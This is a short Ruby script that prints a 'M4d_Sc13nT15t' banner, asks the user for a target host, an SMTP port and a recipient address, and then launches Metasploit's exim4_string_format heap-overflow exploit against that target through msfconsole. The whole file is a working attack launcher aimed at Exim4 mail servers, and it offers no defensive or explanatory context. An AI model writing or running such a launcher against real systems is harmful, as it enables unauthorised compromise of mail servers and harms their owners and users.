require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
   Exim4 string_format Function Heap Buffer Overflow
""".red
puts """
	 1st Try {set RPORT 25; 2nd RPORT 465}""".white






puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] Which SMTP server port (e.g. 25, 465, 587, 2525)? ".blue
print " [!] ---> ".yellow
port = gets.chomp



puts " [?] The TO address of the email? ".blue
print " [!] ---> ".yellow
email = gets.chomp




exec("msfconsole -x 'use exploit/unix/smtp/exim4_string_format' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set MAILTO #{email}' -x 'set VERBOSE true' -x 'run'")

